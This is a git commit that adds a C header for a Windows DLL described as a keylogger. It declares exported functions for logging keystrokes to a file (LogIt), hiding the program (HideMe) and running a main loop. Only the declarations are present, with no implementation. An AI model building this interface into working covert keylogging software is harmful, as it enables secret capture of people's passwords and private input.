04b35254a30b1e55a2a2d787f97068b0d0f79c00
Erickbarrera <ebarr019@fiu.edu>
2014-02-02 08:16:14 -0500

    Keylogger compiles as a DLL

---
+++ LogKeyDLL/src/main.h
@@ -0,0 +1,37 @@
+#ifndef __MAIN_H__
+#define __MAIN_H__
+
+#include <windows.h>
+
+/*  To use this exported function of dll, include this header
+ *  in your project.
+ */
+
+#ifdef BUILD_DLL
+#define DLL_EXPORT __declspec(dllexport)
+#else
+#define DLL_EXPORT __declspec(dllimport)
+#endif
+
+
+#ifdef __cplusplus
+extern "C"
+{
+#endif
+
+
+
+
+    int DLL_EXPORT LogIt(int key_stroke, char *file);
+    void DLL_EXPORT HideMe();
+    int DLL_EXPORT MainLoop();
+    void DLL_EXPORT TestDLL();
+    void StartMainLoop();
+
+
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // __MAIN_H__
